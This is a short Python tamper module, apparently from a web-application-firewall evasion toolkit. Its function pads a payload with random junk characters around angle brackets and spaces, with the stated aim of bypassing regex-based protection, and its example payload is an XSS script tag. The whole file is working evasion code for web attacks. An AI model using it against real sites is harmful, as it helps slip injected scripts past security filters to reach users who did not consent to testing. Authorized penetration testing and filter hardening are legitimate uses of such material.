import random


__example_payload__ = "<script>alert('1');</script>"
__type__ = "adding random junk characters into the payload to bypass regex based protection"


def tamper(payload, **kwargs):
    junk_chars = "!#$%&()*~+-_.,:;?@[/|\]^`"
    retval = ""
    for i, char in enumerate(payload, start=1):
        amount = random.randint(10, 15)
        if char == ">":
            retval += ">"
            for _ in range(amount):
                retval += random.choice(junk_chars)
        elif char == "<":
            retval += "<"
            for _ in range(amount):
                retval += random.choice(junk_chars)
        elif char == " ":
            for _ in range(amount):
                retval += random.choice(junk_chars)
        else:
            retval += char
    return retval
